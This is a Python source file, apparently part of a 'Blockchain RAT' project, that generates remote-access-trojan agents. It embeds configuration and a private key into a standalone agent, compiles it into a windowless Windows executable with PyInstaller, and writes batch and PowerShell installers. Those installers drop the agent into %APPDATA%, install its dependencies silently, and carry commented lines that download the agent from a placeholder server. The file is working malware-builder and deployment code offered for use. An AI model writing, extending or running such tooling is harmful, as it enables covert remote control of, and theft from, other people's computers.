"""
Payload Generator for Blockchain RAT
Generates standalone agent executables with embedded configuration
"""

import os
import sys
import json
import base64
from pathlib import Path


class PayloadGenerator:
    """Generate agent payloads with embedded configuration"""
    
    def __init__(self):
        self.project_root = Path(__file__).parent.parent
        self.agent_path = self.project_root / "agent" / "agent.py"
        self.shared_path = self.project_root / "shared"
    
    def generate_python_payload(self, config, output_path):
        """
        Generate a standalone Python agent with embedded config
        
        Args:
            config: dict with rpc_url, contract_address, private_key, poll_interval
            output_path: where to save the generated agent
        """
        # Read the agent code
        with open(self.agent_path, 'r', encoding='utf-8') as f:
            agent_code = f.read()
        
        # Read shared modules
        encryption_code = self._read_module('encryption.py')
        blockchain_code = self._read_module('blockchain_client.py')
        
        # Create standalone agent with embedded modules
        standalone_code = f'''#!/usr/bin/env python3
"""
Blockchain RAT Agent - Standalone Version
Auto-generated with embedded configuration
"""

import sys
import os
import json
import time
import base64
import gzip
from pathlib import Path

# Embedded configuration
EMBEDDED_CONFIG = {json.dumps(config, indent=4)}

# ============================================================================
# EMBEDDED ENCRYPTION MODULE
# ============================================================================

{self._extract_class_code(encryption_code, 'EncryptionManager')}

# ============================================================================
# EMBEDDED BLOCKCHAIN CLIENT MODULE  
# ============================================================================

{self._extract_class_code(blockchain_code, 'BlockchainClient')}

# ============================================================================
# AGENT CODE
# ============================================================================

{self._extract_agent_main_code(agent_code)}

if __name__ == "__main__":
    # Use embedded config
    config = EMBEDDED_CONFIG
    
    # Parse command line arguments
    import argparse
    parser = argparse.ArgumentParser(description='Blockchain RAT Agent')
    parser.add_argument('--register', action='store_true', help='Register agent')
    parser.add_argument('--session', type=str, help='Session ID to join')
    args = parser.parse_args()
    
    if args.register:
        register_agent(config)
    elif args.session:
        run_agent(config, args.session)
    else:
        print("Usage:")
        print("  Register: python agent.py --register")
        print("  Run: python agent.py --session SESSION_ID")
'''
        
        # Write to output file
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(standalone_code)
        
        # Make executable on Unix
        if os.name != 'nt':
            os.chmod(output_path, 0o755)
        
        return output_path
    
    def generate_exe_payload(self, config, output_path):
        """
        Generate Windows .exe using PyInstaller
        
        Args:
            config: agent configuration
            output_path: where to save the .exe
        """
        try:
            import PyInstaller.__main__
        except ImportError:
            raise ImportError("PyInstaller not installed. Run: pip install pyinstaller")
        
        # First generate Python payload
        temp_py = Path(output_path).parent / "temp_agent.py"
        self.generate_python_payload(config, temp_py)
        
        # Build with PyInstaller
        PyInstaller.__main__.run([
            str(temp_py),
            '--onefile',
            '--noconsole',
            '--name', Path(output_path).stem,
            '--distpath', str(Path(output_path).parent),
            '--workpath', str(Path(output_path).parent / 'build'),
            '--specpath', str(Path(output_path).parent),
        ])
        
        # Clean up temp files
        temp_py.unlink()
        
        return output_path
    
    def _read_module(self, filename):
        """Read a shared module file"""
        module_path = self.shared_path / filename
        with open(module_path, 'r', encoding='utf-8') as f:
            return f.read()
    
    def _extract_class_code(self, code, class_name):
        """Extract a class definition from code"""
        lines = code.split('\n')
        class_lines = []
        in_class = False
        indent_level = 0
        
        for line in lines:
            if f'class {class_name}' in line:
                in_class = True
                indent_level = len(line) - len(line.lstrip())
                class_lines.append(line)
            elif in_class:
                if line.strip() and not line.startswith(' ' * indent_level) and not line.startswith('\t'):
                    # End of class
                    break
                class_lines.append(line)
        
        return '\n'.join(class_lines)
    
    def _extract_agent_main_code(self, code):
        """Extract main agent functions"""
        # Remove imports and if __name__ == "__main__" block
        lines = code.split('\n')
        main_lines = []
        skip_imports = True
        
        for line in lines:
            if skip_imports:
                if line.startswith('import ') or line.startswith('from '):
                    continue
                if line.strip() == '':
                    continue
                skip_imports = False
            
            if 'if __name__' in line:
                break
            
            main_lines.append(line)
        
        return '\n'.join(main_lines)
    
    def generate_batch_script(self, config, output_path):
        """
        Generate a Windows batch script that downloads and runs the agent
        
        Args:
            config: agent configuration
            output_path: where to save the .bat file
        """
        # Encode config as base64
        config_b64 = base64.b64encode(json.dumps(config).encode()).decode()
        
        batch_script = f'''@echo off
REM Blockchain RAT Agent Installer
echo Installing Blockchain RAT Agent...

REM Check Python
python --version >nul 2>&1
if errorlevel 1 (
    echo ERROR: Python not installed
    pause
    exit /b 1
)

REM Install dependencies
echo Installing dependencies...
pip install web3 cryptography pycryptodome psutil pillow requests >nul 2>&1

REM Create agent directory
if not exist "%APPDATA%\\BlockchainRAT" mkdir "%APPDATA%\\BlockchainRAT"
cd /d "%APPDATA%\\BlockchainRAT"

REM Decode and save config
echo {config_b64} > config.b64
certutil -decode config.b64 config.json >nul 2>&1
del config.b64

REM Download agent (you need to host this somewhere)
REM curl -o agent.py https://your-server.com/agent.py

REM For now, create a simple agent
echo import sys > agent.py
echo print("Agent placeholder") >> agent.py

REM Register agent
python agent.py --register --config config.json

echo.
echo Agent installed successfully!
echo Location: %APPDATA%\\BlockchainRAT
echo.
pause
'''
        
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(batch_script)
        
        return output_path
    
    def generate_powershell_script(self, config, output_path):
        """
        Generate a PowerShell script for agent deployment
        
        Args:
            config: agent configuration
            output_path: where to save the .ps1 file
        """
        config_json = json.dumps(config, indent=2)
        
        ps_script = f'''# Blockchain RAT Agent Installer
Write-Host "Installing Blockchain RAT Agent..." -ForegroundColor Cyan

# Check Python
try {{
    python --version | Out-Null
}} catch {{
    Write-Host "ERROR: Python not installed" -ForegroundColor Red
    exit 1
}}

# Install dependencies
Write-Host "Installing dependencies..." -ForegroundColor Yellow
pip install web3 cryptography pycryptodome psutil pillow requests | Out-Null

# Create agent directory
$agentDir = "$env:APPDATA\\BlockchainRAT"
if (!(Test-Path $agentDir)) {{
    New-Item -ItemType Directory -Path $agentDir | Out-Null
}}

Set-Location $agentDir

# Save configuration
$config = @'
{config_json}
'@

$config | Out-File -FilePath "config.json" -Encoding UTF8

# Download agent code (implement your download logic here)
# Invoke-WebRequest -Uri "https://your-server.com/agent.py" -OutFile "agent.py"

Write-Host ""
Write-Host "Agent installed successfully!" -ForegroundColor Green
Write-Host "Location: $agentDir" -ForegroundColor Cyan
Write-Host ""
Write-Host "To register agent: python agent.py --register --config config.json"
Write-Host "To run agent: python agent.py --session SESSION_ID --config config.json"
Write-Host ""
pause
'''
        
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(ps_script)
        
        return output_path

